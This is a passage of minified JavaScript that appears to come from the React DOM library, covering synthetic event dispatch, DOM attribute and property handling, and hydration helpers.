Ipe(u,d,p,g,D){if(d==="submit"&&p&&p.stateNode===D){var F=XF((D[Jr]||null).action),K=g.submitter;K&&(d=(d=K[Jr]||null)?XF(d.formAction):K.getAttribute("formAction"),d!==null&&(F=d,K=null));var te=new ll("action","action",null,g,D);u.push({event:te,listeners:[{instance:null,listener:function(){if(g.defaultPrevented){if(Rh!==0){var ce=K?e$(D,K):new FormData(D);hP(p,{pending:!0,data:ce,method:D.method,action:F},null,ce)}}else typeof F=="function"&&(te.preventDefault(),ce=K?e$(D,K):new FormData(D),hP(p,{pending:!0,data:ce,method:D.method,action:F},F,ce))},currentTarget:D}]})}}for(var KP=0;KP<PR.length;KP++){var ZP=PR[KP],Rpe=ZP.toLowerCase(),Ppe=ZP[0].toUpperCase()+ZP.slice(1);cu(Rpe,"on"+Ppe)}cu(NU,"onAnimationEnd"),cu(OU,"onAnimationIteration"),cu(kU,"onAnimationStart"),cu("dblclick","onDoubleClick"),cu("focusin","onFocus"),cu("focusout","onBlur"),cu(Whe,"onTransitionRun"),cu(Ghe,"onTransitionStart"),cu(Khe,"onTransitionCancel"),cu(DU,"onTransitionEnd"),Ea("onMouseEnter",["mouseout","mouseover"]),Ea("onMouseLeave",["mouseout","mouseover"]),Ea("onPointerEnter",["pointerout","pointerover"]),Ea("onPointerLeave",["pointerout","pointerover"]),ac("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),ac("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),ac("onBeforeInput",["compositionend","keypress","textInput","paste"]),ac("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),ac("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),ac("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var sv="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Npe=new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(sv));function t$(u,d){d=(d&4)!==0;for(var p=0;p<u.length;p++){var g=u[p],D=g.event;g=g.listeners;e:{var F=void 0;if(d)for(var K=g.length-1;0<=K;K--){var te=g[K],ce=te.instance,Ae=te.currentTarget;if(te=te.listener,ce!==F&&D.isPropagationStopped())break e;F=te,D.currentTarget=Ae;try{F(D)}catch(De){_5(De)}D.currentTarget=null,F=ce}else for(K=0;K<g.length;K++){if(te=g[K],ce=te.instance,Ae=te.currentTarget,te=te.listener,ce!==F&&D.isPropagationStopped())break e;F=te,D.currentTarget=Ae;try{F(D)}catch(De){_5(De)}D.currentTarget=null,F=ce}}}}function dn(u,d){var p=d[nu];p===void 0&&(p=d[nu]=new Set);var g=u+"__bubble";p.has(g)||(n$(d,u,2,!1),p.add(g))}function YP(u,d,p){var g=0;d&&(g|=4),n$(p,u,g,d)}var c3="_reactListening"+Math.random().toString(36).slice(2);function QP(u){if(!u[c3]){u[c3]=!0,sh.forEach(function(p){p!=="selectionchange"&&(Npe.has(p)||YP(p,!1,u),YP(p,!0,u))});var d=u.nodeType===9?u:u.ownerDocument;d===null||d[c3]||(d[c3]=!0,YP("selectionchange",!1,d))}}function n$(u,d,p,g){switch(N$(d)){case 2:var D=s0e;break;case 8:D=o0e;break;default:D=fN}p=D.bind(null,d,p,u),D=void 0,!fd||d!=="touchstart"&&d!=="touchmove"&&d!=="wheel"||(D=!0),g?D!==void 0?u.addEventListener(d,p,{capture:!0,passive:D}):u.addEventListener(d,p,!0):D!==void 0?u.addEventListener(d,p,{passive:D}):u.addEventListener(d,p,!1)}function JP(u,d,p,g,D){var F=g;if((d&1)===0&&(d&2)===0&&g!==null)e:for(;;){if(g===null)return;var K=g.tag;if(K===3||K===4){var te=g.stateNode.containerInfo;if(te===D)break;if(K===4)for(K=g.return;K!==null;){var ce=K.tag;if((ce===3||ce===4)&&K.stateNode.containerInfo===D)return;K=K.return}for(;te!==null;){if(K=No(te),K===null)return;if(ce=K.tag,ce===5||ce===6||ce===26||ce===27){g=F=K;continue e}te=te.parentNode}}g=g.return}cl(function(){var Ae=F,De=Oo(p),Le=[];e:{var Se=BU.get(u);if(Se!==void 0){var Pe=ll,vt=u;switch(u){case"keypress":if(T0(p)===0)break e;case"keydown":case"keyup":Pe=w5;break;case"focusin":vt="focus",Pe=I0;break;case"focusout":vt="blur",Pe=I0;break;case"beforeblur":case"afterblur":Pe=I0;break;case"click":if(p.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":Pe=Pw;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":Pe=l5;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":Pe=W;break;case NU:case OU:case kU:Pe=f5;break;case DU:Pe=se;break;case"scroll":case"scrollend":Pe=Rw;break;case"wheel":Pe=Ie;break;case"copy":case"cut":case"paste":Pe=h5;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":Pe=md;break;case"toggle":case"beforetoggle":Pe=Zt}var Ut=(d&4)!==0,sr=!Ut&&(u==="scroll"||u==="scrollend"),ye=Ut?Se!==null?Se+"Capture":null:Se;Ut=[];for(var fe=Ae,_e;fe!==null;){var je=fe;if(_e=je.stateNode,je=je.tag,je!==5&&je!==26&&je!==27||_e===null||ye===null||(je=Aa(fe,ye),je!=null&&Ut.push(ov(fe,je,_e))),sr)break;fe=fe.return}0<Ut.length&&(Se=new Pe(Se,vt,null,p,De),Le.push({event:Se,listeners:Ut}))}}if((d&7)===0){e:{if(Se=u==="mouseover"||u==="pointerover",Pe=u==="mouseout"||u==="pointerout",Se&&p!==C0&&(vt=p.relatedTarget||p.fromElement)&&(No(vt)||vt[Ds]))break e;if((Pe||Se)&&(Se=De.window===De?De:(Se=De.ownerDocument)?Se.defaultView||Se.parentWindow:window,Pe?(vt=p.relatedTarget||p.toElement,Pe=Ae,vt=vt?No(vt):null,vt!==null&&(sr=s(vt),Ut=vt.tag,vt!==sr||Ut!==5&&Ut!==27&&Ut!==6)&&(vt=null)):(Pe=null,vt=Ae),Pe!==vt)){if(Ut=Pw,je="onMouseLeave",ye="onMouseEnter",fe="mouse",(u==="pointerout"||u==="pointerover")&&(Ut=md,je="onPointerLeave",ye="onPointerEnter",fe="pointer"),sr=Pe==null?Se:Bs(Pe),_e=vt==null?Se:Bs(vt),Se=new Ut(je,fe+"leave",Pe,p,De),Se.target=sr,Se.relatedTarget=_e,je=null,No(De)===Ae&&(Ut=new Ut(ye,fe+"enter",vt,p,De),Ut.target=_e,Ut.relatedTarget=sr,je=Ut),sr=je,Pe&&vt)t:{for(Ut=Ope,ye=Pe,fe=vt,_e=0,je=ye;je;je=Ut(je))_e++;je=0;for(var It=fe;It;It=Ut(It))je++;for(;0<_e-je;)ye=Ut(ye),_e--;for(;0<je-_e;)fe=Ut(fe),je--;for(;_e--;){if(ye===fe||fe!==null&&ye===fe.alternate){Ut=ye;break t}ye=Ut(ye),fe=Ut(fe)}Ut=null}else Ut=null;Pe!==null&&r$(Le,Se,Pe,Ut,!1),vt!==null&&sr!==null&&r$(Le,sr,vt,Ut,!0)}}e:{if(Se=Ae?Bs(Ae):window,Pe=Se.nodeName&&Se.nodeName.toLowerCase(),Pe==="select"||Pe==="input"&&Se.type==="file")var On=vU;else if(bU(Se))if(EU)On=zhe;else{On=$he;var Ct=Fhe}else Pe=Se.nodeName,!Pe||Pe.toLowerCase()!=="input"||Se.type!=="checkbox"&&Se.type!=="radio"?Ae&&uh(Ae.elementType)&&(On=vU):On=Hhe;if(On&&(On=On(u,Ae))){wU(Le,On,p,De);break e}Ct&&Ct(u,Se,Ae),u==="focusout"&&Ae&&Se.type==="number"&&Ae.memoizedProps.value!=null&&ch(Se,"number",Se.value)}switch(Ct=Ae?Bs(Ae):window,u){case"focusin":(bU(Ct)||Ct.contentEditable==="true")&&(Ty=Ct,xR=Ae,Bw=null);break;case"focusout":Bw=xR=Ty=null;break;case"mousedown":IR=!0;break;case"contextmenu":case"mouseup":case"dragend":IR=!1,RU(Le,p,De);break;case"selectionchange":if(Vhe)break;case"keydown":case"keyup":RU(Le,p,De)}var Xt;if($n)e:{switch(u){case"compositionstart":var hn="onCompositionStart";break e;case"compositionend":hn="onCompositionEnd";break e;case"compositionupdate":hn="onCompositionUpdate";break e}hn=void 0}else Sy?R0(u,p)&&(hn="onCompositionEnd"):u==="keydown"&&p.keyCode===229&&(hn="onCompositionStart");hn&&(hl&&p.locale!=="ko"&&(Sy||hn!=="onCompositionStart"?hn==="onCompositionEnd"&&Sy&&(Xt=Iw()):(ul=De,xw="value"in ul?ul.value:ul.textContent,Sy=!0)),Ct=u3(Ae,hn),0<Ct.length&&(hn=new fl(hn,u,null,p,De),Le.push({event:hn,listeners:Ct}),Xt?hn.data=Xt:(Xt=Cy(p),Xt!==null&&(hn.data=Xt)))),(Xt=dc?jhe(u,p):Mhe(u,p))&&(hn=u3(Ae,"onBeforeInput"),0<hn.length&&(Ct=new fl("onBeforeInput","beforeinput",null,p,De),Le.push({event:Ct,listeners:hn}),Ct.data=Xt)),Ipe(Le,u,Ae,p,De)}t$(Le,d)})}function ov(u,d,p){return{instance:u,listener:d,currentTarget:p}}function u3(u,d){for(var p=d+"Capture",g=[];u!==null;){var D=u,F=D.stateNode;if(D=D.tag,D!==5&&D!==26&&D!==27||F===null||(D=Aa(u,p),D!=null&&g.unshift(ov(u,D,F)),D=Aa(u,d),D!=null&&g.push(ov(u,D,F))),u.tag===3)return g;u=u.return}return[]}function Ope(u){if(u===null)return null;do u=u.return;while(u&&u.tag!==5&&u.tag!==27);return u||null}function r$(u,d,p,g,D){for(var F=d._reactName,K=[];p!==null&&p!==g;){var te=p,ce=te.alternate,Ae=te.stateNode;if(te=te.tag,ce!==null&&ce===g)break;te!==5&&te!==26&&te!==27||Ae===null||(ce=Ae,D?(Ae=Aa(p,F),Ae!=null&&K.unshift(ov(p,Ae,ce))):D||(Ae=Aa(p,F),Ae!=null&&K.push(ov(p,Ae,ce)))),p=p.return}K.length!==0&&u.push({event:d,listeners:K})}var kpe=/\r\n?/g,Dpe=/\u0000|\uFFFD/g;function i$(u){return(typeof u=="string"?u:""+u).replace(kpe,`
`).replace(Dpe,"")}function s$(u,d){return d=i$(d),i$(u)===d}function ir(u,d,p,g,D,F){switch(p){case"children":typeof g=="string"?d==="body"||d==="textarea"&&g===""||Ms(u,g):(typeof g=="number"||typeof g=="bigint")&&d!=="body"&&Ms(u,""+g);break;case"className":ls(u,"class",g);break;case"tabIndex":ls(u,"tabindex",g);break;case"dir":case"role":case"viewBox":case"width":case"height":ls(u,p,g);break;case"style":A0(u,g,F);break;case"data":if(d!=="object"){ls(u,"data",g);break}case"src":case"href":if(g===""&&(d!=="a"||p!=="href")){u.removeAttribute(p);break}if(g==null||typeof g=="function"||typeof g=="symbol"||typeof g=="boolean"){u.removeAttribute(p);break}g=ol(""+g),u.setAttribute(p,g);break;case"action":case"formAction":if(typeof g=="function"){u.setAttribute(p,"javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");break}else typeof F=="function"&&(p==="formAction"?(d!=="input"&&ir(u,d,"name",D.name,D,null),ir(u,d,"formEncType",D.formEncType,D,null),ir(u,d,"formMethod",D.formMethod,D,null),ir(u,d,"formTarget",D.formTarget,D,null)):(ir(u,d,"encType",D.encType,D,null),ir(u,d,"method",D.method,D,null),ir(u,d,"target",D.target,D,null)));if(g==null||typeof g=="symbol"||typeof g=="boolean"){u.removeAttribute(p);break}g=ol(""+g),u.setAttribute(p,g);break;case"onClick":g!=null&&(u.onclick=_a);break;case"onScroll":g!=null&&dn("scroll",u);break;case"onScrollEnd":g!=null&&dn("scrollend",u);break;case"dangerouslySetInnerHTML":if(g!=null){if(typeof g!="object"||!("__html"in g))throw Error(r(61));if(p=g.__html,p!=null){if(D.children!=null)throw Error(r(60));u.innerHTML=p}}break;case"multiple":u.multiple=g&&typeof g!="function"&&typeof g!="symbol";break;case"muted":u.muted=g&&typeof g!="function"&&typeof g!="symbol";break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"defaultValue":case"defaultChecked":case"innerHTML":case"ref":break;case"autoFocus":break;case"xlinkHref":if(g==null||typeof g=="function"||typeof g=="boolean"||typeof g=="symbol"){u.removeAttribute("xlink:href");break}p=ol(""+g),u.setAttributeNS("http://www.w3.org/1999/xlink","xlink:href",p);break;case"contentEditable":case"spellCheck":case"draggable":case"value":case"autoReverse":case"externalResourcesRequired":case"focusable":case"preserveAlpha":g!=null&&typeof g!="function"&&typeof g!="symbol"?u.setAttribute(p,""+g):u.removeAttribute(p);break;case"inert":case"allowFullScreen":case"async":case"autoPlay":case"controls":case"default":case"defer":case"disabled":case"disablePictureInPicture":case"disableRemotePlayback":case"formNoValidate":case"hidden":case"loop":case"noModule":case"noValidate":case"open":case"playsInline":case"readOnly":case"required":case"reversed":case"scoped":case"seamless":case"itemScope":g&&typeof g!="function"&&typeof g!="symbol"?u.setAttribute(p,""):u.removeAttribute(p);break;case"capture":case"download":g===!0?u.setAttribute(p,""):g!==!1&&g!=null&&typeof g!="function"&&typeof g!="symbol"?u.setAttribute(p,g):u.removeAttribute(p);break;case"cols":case"rows":case"size":case"span":g!=null&&typeof g!="function"&&typeof g!="symbol"&&!isNaN(g)&&1<=g?u.setAttribute(p,g):u.removeAttribute(p);break;case"rowSpan":case"start":g==null||typeof g=="function"||typeof g=="symbol"||isNaN(g)?u.removeAttribute(p):u.setAttribute(p,g);break;case"popover":dn("beforetoggle",u),dn("toggle",u),oh(u,"popover",g);break;case"xlinkActuate":Xr(u,"http://www.w3.org/1999/xlink","xlink:actuate",g);break;case"xlinkArcrole":Xr(u,"http://www.w3.org/1999/xlink","xlink:arcrole",g);break;case"xlinkRole":Xr(u,"http://www.w3.org/1999/xlink","xlink:role",g);break;case"xlinkShow":Xr(u,"http://www.w3.org/1999/xlink","xlink:show",g);break;case"xlinkTitle":Xr(u,"http://www.w3.org/1999/xlink","xlink:title",g);break;case"xlinkType":Xr(u,"http://www.w3.org/1999/xlink","xlink:type",g);break;case"xmlBase":Xr(u,"http://www.w3.org/XML/1998/namespace","xml:base",g);break;case"xmlLang":Xr(u,"http://www.w3.org/XML/1998/namespace","xml:lang",g);break;case"xmlSpace":Xr(u,"http://www.w3.org/XML/1998/namespace","xml:space",g);break;case"is":oh(u,"is",g);break;case"innerText":case"textContent":break;default:(!(2<p.length)||p[0]!=="o"&&p[0]!=="O"||p[1]!=="n"&&p[1]!=="N")&&(p=vy.get(p)||p,oh(u,p,g))}}function XP(u,d,p,g,D,F){switch(p){case"style":A0(u,g,F);break;case"dangerouslySetInnerHTML":if(g!=null){if(typeof g!="object"||!("__html"in g))throw Error(r(61));if(p=g.__html,p!=null){if(D.children!=null)throw Error(r(60));u.innerHTML=p}}break;case"children":typeof g=="string"?Ms(u,g):(typeof g=="number"||typeof g=="bigint")&&Ms(u,""+g);break;case"onScroll":g!=null&&dn("scroll",u);break;case"onScrollEnd":g!=null&&dn("scrollend",u);break;case"onClick":g!=null&&(u.onclick=_a);break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"innerHTML":case"ref":break;case"innerText":case"textContent":break;default:if(!y0.hasOwnProperty(p))e:{if(p[0]==="o"&&p[1]==="n"&&(D=p.endsWith("Capture"),d=p.slice(2,D?p.length-7:void 0),F=u[Jr]||null,F=F!=null?F[p]:null,typeof F=="function"&&u.removeEventListener(d,F,D),typeof g=="function")){typeof F!="function"&&F!==null&&(p in u?u[p]=null:u.hasAttribute(p)&&u.removeAttribute(p)),u.addEventListener(d,g,D);break e}p in u?u[p]=g:g===!0?u.setAttribute(p,""):oh(u,p,g)}}}function ms(u,d,p){switch(d){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"img":dn("error",u),dn("load",u);var g=!1,D=!1,F;for(F in p)if(p.hasOwnProperty(F)){var K=p[F];if(K!=null)switch(F){case"src":g=!0;break;case"srcSet":D=!0;break;case"children":case"dangerouslySetInnerHTML":throw Error(r(137,d));default:ir(u,d,F,K,p,null)}}D&&ir(u,d,"srcSet",p.srcSet,p,null),g&&ir(u,d,"src",p.src,p,null);return;case"input":dn("invalid",u);var te=F=K=D=null,ce=null,Ae=null;for(g in p)if(p.hasOwnProperty(g)){var De=p[g];if(De!=null)switch(g){case"name":D=De;break;case"type":K=De;break;case"checked":ce=De;break;case"defaultChecked":Ae=De;break;case"value":F=De;break;case"defaultValue":te=De;break;case"children":case"dangerouslySetInnerHTML":if(De!=null)throw Error(r(137,d));break;default:ir(u,d,g,De,p,null)}}yy(u,F,te,ce,Ae,K,D,!1);return;case"select":dn("invalid",u),g=K=F=null;for(D in p)if(p.hasOwnProperty(D)&&(te=p[D],te!=null))switch(D){case"value":F=te;break;case"defaultValue":K=te;break;case"multiple":g=te;default:ir(u,d,D,te,p,null)}d=F,p=K,u.multiple=!!g,d!=null?il(u,!!g,d,!1):p!=null&&il(u,!!g,p,!0);return;case"textarea":dn("invalid",u),F=D=g=null;for(K in p)if(p.hasOwnProperty(K)&&(te=p[K],te!=null))switch(K){case"value":g=te;break;case"defaultValue":D=te;break;case"children":F=te;break;case"dangerouslySetInnerHTML":if(te!=null)throw Error(r(91));break;default:ir(u,d,K,te,p,null)}iu(u,g,D,F);return;case"option":for(ce in p)if(p.hasOwnProperty(ce)&&(g=p[ce],g!=null))switch(ce){case"selected":u.selected=g&&typeof g!="function"&&typeof g!="symbol";break;default:ir(u,d,ce,g,p,null)}return;case"dialog":dn("beforetoggle",u),dn("toggle",u),dn("cancel",u),dn("close",u);break;case"iframe":case"object":dn("load",u);break;case"video":case"audio":for(g=0;g<sv.length;g++)dn(sv[g],u);break;case"image":dn("error",u),dn("load",u);break;case"details":dn("toggle",u);break;case"embed":case"source":case"link":dn("error",u),dn("load",u);case"area":case"base":case"br":case"col":case"hr":case"keygen":case"meta":case"param":case"track":case"wbr":case"menuitem":for(Ae in p)if(p.hasOwnProperty(Ae)&&(g=p[Ae],g!=null))switch(Ae){case"children":case"dangerouslySetInnerHTML":throw Error(r(137,d));default:ir(u,d,Ae,g,p,null)}return;default:if(uh(d)){for(De in p)p.hasOwnProperty(De)&&(g=p[De],g!==void 0&&XP(u,d,De,g,p,void 0));return}}for(te in p)p.hasOwnProperty(te)&&(g=p[te],g!=null&&ir(u,d,te,g,p,null))}function Bpe(u,d,p,g){switch(d){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"input":var D=null,F=null,K=null,te=null,ce=null,Ae=null,De=null;for(Pe in p){var Le=p[Pe];if(p.hasOwnProperty(Pe)&&Le!=null)switch(Pe){case"checked":break;case"value":break;case"defaultValue":ce=Le;default:g.hasOwnProperty(Pe)||ir(u,d,Pe,null,g,Le)}}for(var Se in g){var Pe=g[Se];if(Le=p[Se],g.hasOwnProperty(Se)&&(Pe!=null||Le!=null))switch(Se){case"type":F=Pe;break;case"name":D=Pe;break;case"checked":Ae=Pe;break;case"defaultChecked":De=Pe;break;case"value":K=Pe;break;case"defaultValue":te=Pe;break;case"children":case"dangerouslySetInnerHTML":if(Pe!=null)throw Error(r(137,d));break;default:Pe!==Le&&ir(u,d,Se,Pe,g,Le)}}ah(u,K,te,ce,Ae,De,F,D);return;case"select":Pe=K=te=Se=null;for(F in p)if(ce=p[F],p.hasOwnProperty(F)&&ce!=null)switch(F){case"value":break;case"multiple":Pe=ce;default:g.hasOwnProperty(F)||ir(u,d,F,null,g,ce)}for(D in g)if(F=g[D],ce=p[D],g.hasOwnProperty(D)&&(F!=null||ce!=null))switch(D){case"value":Se=F;break;case"defaultValue":te=F;break;case"multiple":K=F;default:F!==ce&&ir(u,d,D,F,g,ce)}d=te,p=K,g=Pe,Se!=null?il(u,!!p,Se,!1):!!g!=!!p&&(d!=null?il(u,!!p,d,!0):il(u,!!p,p?[]:"",!1));return;case"textarea":Pe=Se=null;for(te in p)if(D=p[te],p.hasOwnProperty(te)&&D!=null&&!g.hasOwnProperty(te))switch(te){case"value":break;case"children":break;default:ir(u,d,te,null,g,D)}for(K in g)if(D=g[K],F=p[K],g.hasOwnProperty(K)&&(D!=null||F!=null))switch(K){case"value":Se=D;break;case"defaultValue":Pe=D;break;case"children":break;case"dangerouslySetInnerHTML":if(D!=null)throw Error(r(91));break;default:D!==F&&ir(u,d,K,D,g,F)}by(u,Se,Pe);return;case"option":for(var vt in p)if(Se=p[vt],p.hasOwnProperty(vt)&&Se!=null&&!g.hasOwnProperty(vt))switch(vt){case"selected":u.selected=!1;break;default:ir(u,d,vt,null,g,Se)}for(ce in g)if(Se=g[ce],Pe=p[ce],g.hasOwnProperty(ce)&&Se!==Pe&&(Se!=null||Pe!=null))switch(ce){case"selected":u.selected=Se&&typeof Se!="function"&&typeof Se!="symbol";break;default:ir(u,d,ce,Se,g,Pe)}return;case"img":case"link":case"area":case"base":case"br":case"col":case"embed":case"hr":case"keygen":case"meta":case"param":case"source":case"track":case"wbr":case"menuitem":for(var Ut in p)Se=p[Ut],p.hasOwnProperty(Ut)&&Se!=null&&!g.hasOwnProperty(Ut)&&ir(u,d,Ut,null,g,Se);for(Ae in g)if(Se=g[Ae],Pe=p[Ae],g.hasOwnProperty(Ae)&&Se!==Pe&&(Se!=null||Pe!=null))switch(Ae){case"children":case"dangerouslySetInnerHTML":if(Se!=null)throw Error(r(137,d));break;default:ir(u,d,Ae,Se,g,Pe)}return;default:if(uh(d)){for(var sr in p)Se=p[sr],p.hasOwnProperty(sr)&&Se!==void 0&&!g.hasOwnProperty(sr)&&XP(u,d,sr,void 0,g,Se);for(De in g)Se=g[De],Pe=p[De],!g.hasOwnProperty(De)||Se===Pe||Se===void 0&&Pe===void 0||XP(u,d,De,Se,g,Pe);return}}for(var ye in p)Se=p[ye],p.hasOwnProperty(ye)&&Se!=null&&!g.hasOwnProperty(ye)&&ir(u,d,ye,null,g,Se);for(Le in g)Se=g[Le],Pe=p[Le],!g.hasOwnProperty(Le)||Se===Pe||Se==null&&Pe==null||ir(u,d,Le,Se,g,Pe)}function o$(u){switch(u){case"css":case"script":case"font":case"img":case"image":case"input":case"link":return!0;default:return!1}}function jpe(){if(typeof performance.getEntriesByType=="function"){for(var u=0,d=0,p=performance.getEntriesByType("resource"),g=0;g<p.length;g++){var D=p[g],F=D.transferSize,K=D.initiatorType,te=D.duration;if(F&&te&&o$(K)){for(K=0,te=D.responseEnd,g+=1;g<p.length;g++){var ce=p[g],Ae=ce.startTime;if(Ae>te)break;var De=ce.transferSize,Le=ce.initiatorType;De&&o$(Le)&&(ce=ce.responseEnd,K+=De*(ce<te?1:(te-Ae)/(ce-Ae)))}if(--g,d+=8*(F+K)/(D.duration/1e3),u++,10<u)break}}if(0<u)return d/u/1e6}return navigator.connection&&(u=navigator.connection.downlink,typeof u=="number")?u:5}var eN=null,tN=null;function l3(u){return u.nodeType===9?u:u.ownerDocument}function a$(u){switch(u){case"http://www.w3.org/2000/svg":return 1;case"http://www.w3.org/1998/Math/MathML":return 2;default:return 0}}function c$(u,d){if(u===0)switch(d){case"svg":return 1;case"math":return 2;default:return 0}return u===1&&d==="foreignObject"?0:u}function nN(u,d){return u==="textarea"||u==="noscript"||typeof d.children=="string"||typeof d.children=="number"||typeof d.children=="bigint"||typeof d.dangerouslySetInnerHTML=="object"&&d.dangerouslySetInnerHTML!==null&&d.dangerouslySetInnerHTML.__html!=null}var rN=null;function Mpe(){var u=window.event;return u&&u.type==="popstate"?u===rN?!1:(rN=u,!0):(rN=null,!1)}var u$=typeof setTimeout=="function"?setTimeout:void 0,Upe=typeof clearTimeout=="function"?clearTimeout:void 0,l$=typeof Promise=="function"?Promise:void 0,Lpe=typeof queueMicrotask=="function"?queueMicrotask:typeof l$<"u"?function(u){return l$.resolve(null).then(u).catch(Fpe)}:u$;function Fpe(u){setTimeout(function(){throw u})}function Ph(u){return u==="head"}function d$(u,d){var p=d,g=0;do{var D=p.nextSibling;if(u.removeChild(p),D&&D.nodeType===8)if(p=D.data,p==="/$"||p==="/&"){if(g===0){u.removeChild(D),Xy(d);return}g--}else if(p==="$"||p==="$?"||p==="$~"||p==="$!"||p==="&")g++;else if(p==="html")av(u.ownerDocument.documentElement);else if(p==="head"){p=u.ownerDocument.head,av(p);for(var F=p.firstChild;F;){var K=F.nextSibling,te=F.nodeName;F[Po]||te==="SCRIPT"||te==="STYLE"||te==="LINK"&&F.rel.toLowerCase()==="stylesheet"||p.removeChild(F),F=K}}else p==="body"&&av(u.ownerDocument.body);p=D}while(p);Xy(d)}function f$(u,d){var p=u;u=0;do{var g=p.nextSibling;if(p.nodeType===1?d?(p._stashedDisplay=p.style.display,p.style.display="none"):(p.style.display=p._stashedDisplay||"",p.getAttribute("style")===""&&p.removeAttribute("style")):p.nodeType===3&&(d?(p._stashedText=p.nodeValue,p.nodeValue=""):p.nodeValue=p._stashedText||""),g&&g.nodeType===8)if(p=g.data,p==="/$"){if(u===0)break;u--}else p!=="$"&&p!=="$?"&&p!=="$~"&&p!=="$!"||u++;p=g}while(p)}function iN(u){var d=u.firstChild;for(d&&d.nodeType===10&&(d=d.nextSibling);d;){var p=d;switch(d=d.nextSibling,p.nodeName){case"HTML":case"HEAD":case"BODY":iN(p),nl(p);continue;case"SCRIPT":case"STYLE":continue;case"LINK":if(p.rel.toLowerCase()==="stylesheet")continue}u.removeChild(p)}}function $pe(u,d,p,g){for(;u.nodeType===1;){var D=p;if(u.nodeName.toLowerCase()!==d.toLowerCase()){if(!g&&(u.nodeName!=="INPUT"||u.type!=="hidden"))break}else if(g){if(!u[Po])switch(d){case"meta":if(!u.hasAttribute("itemprop"))break;return u;case"link":if(F=u.getAttribute("rel"),F==="stylesheet"&&u.hasAttribute("data-precedence"))break;if(F!==D.rel||u.getAttribute("href")!==(D.href==null||D.href===""?null:D.href)||u.getAttribute("crossorigin")!==(D.crossOrigin==null?null:D.crossOrigin)||u.getAttribute("title")!==(D.title==null?null:D.title))break;return u;case"style":if(u.hasAttribute("data-precedence"))break;return u;case"script":if(F=u.getAttribute("src"),(F!==(D.src==null?null:D.src)||u.getAttribute("type")!==(D.type==null?null:D.type)||u.getAttribute("crossorigin")!==(D.crossOrigin==null?null:D.crossOrigin))&&F&&u.hasAttribute("async")&&!u.hasAttribute("itemprop"))break;return u;default:return u}}else if(d==="input"&&u.type==="hidden"){var F=D.name==null?null:""+D.name;if(D.type==="hidden"&&u.getAttribute("name")===F)return u}else return u;if(u=bc(u.nextSibling),u===null)break}return null}function Hpe(u,d,p){if(d==="")return null;for(;u.nodeType!==3;)if((u.nodeType!==1||u.nodeName!=="INPUT"||u.type!=="hidden")&&!p||(u=bc(u.nextSibling),u===null))return null;return u}function h$(u,d){for(;u.nodeType!==8;)if((u.nodeType!==1||u.nodeName!=="INPUT"||u.type!=="hidden")&&!d||(u=bc(u.nextSibling),u===null))return null;return u}function sN(u){return u.data==="$?"||u.data==="$~"}function oN(u){return u.data==="$!"||u.data==="$?"&&u.ownerDocument.readyState!=="loading"}function zpe(u,d){var p=u.ownerDocument;if(u.data==="$~")u._reactRetry=d;else if(u.data!=="$?"||p.readyState!=="loading")d();else{var g=function(){d(),p.removeEventListener("DOMContentLoaded",g)};p.addEventListener("DOMContentLoaded",g),u._reactRetry=g}}function bc(u){for(;u!=null;u=u.nextSibling){var d=u.nodeType;if(d===1||d===3)break;if(d===8){if(d=u.data,d==="$"||d==="$!"||d==="$?"||d==="$~"||d==="&"||d==="F!"||d==="F")break;if(d==="/$"||d==="/&")return null}}return u}var aN=null;function p$(u){u=u.nextSibling;for(var d=0;u;){if(u.nodeType===8){var p=u.data;if(p==="/$"||p==="/&"){if(d===0)return bc(u.nextSibling);d--}else p!=="$"&&p!=="$!"&&p!=="$?"&&p!=="$~"&&p!=="&"||d++}u=u.nextSibling}return null}function m$(u){u=u.previousSibling;for(var d=0;u;){if(u.nodeType===8){var p=u.data;if(p==="$"||p==="$!"||p==="$?"||p==="$~"||p==="&"){if(d===0)return u;d--}else p!=="/$"&&p!=="/&"||d++}u=u.previousSibling}return null}function g$(u,d,p){switch(d=l3(p),u){case"html":if(u=d.documentElement,!u)throw Error(r(452));return u;case"head":if(u=d.head,!u)throw Error(r(453));return u;case"body":if(u=d.body,!u)throw Error(r(454));return u;default:throw Error(r(451))}}function av(u){for(var d=u.attributes;d.length;)u.removeAttributeNode(d[0]);nl(u)}var wc=new Map,y$=new Set;function d3(u){return typeof u.getRootNode=="function"?u.getRootNode():u.nodeType===9?u:u.ownerDocument}var Pd=j.d;j.d={f:qpe,r:Vpe,D:Wpe,C:Gpe,L:Kpe,m:Zpe,X:Qpe,S:Ype,M:Jpe};function qpe(){var u=Pd.f(),d=n3();return u||d}function Vpe(u){var d=us(u);d!==null&&d.tag===5&&d.type==="form"?DL(d):Pd.r(u)}var Yy=typeof document>"u"?null:document;function b$(u,d,p){var g=Yy;if(g&&typeof d=="string"&&d){var D=js(d);D='link[rel="'+u+'"][href="'+D+'"]',typeof p=="string"&&(D+='[crossorigin="'+p+'"]'),y$.has(D)||(y$.add(D),u={rel:u,crossOrigin:p,href:d},g.querySelector(D)===null&&(d=g.createElement("link"),ms(d,"link",u),zr(d),g.head.appendChild(d)))}}function Wpe(u){Pd.D(u),b$("dns-prefetch",u,null)}function Gpe(u,d){Pd.C(u,d),b$("preconnect",u,d)}function Kpe(u,d,p){Pd.L(u,d,p);var g=Yy;if(g&&u&&d){var 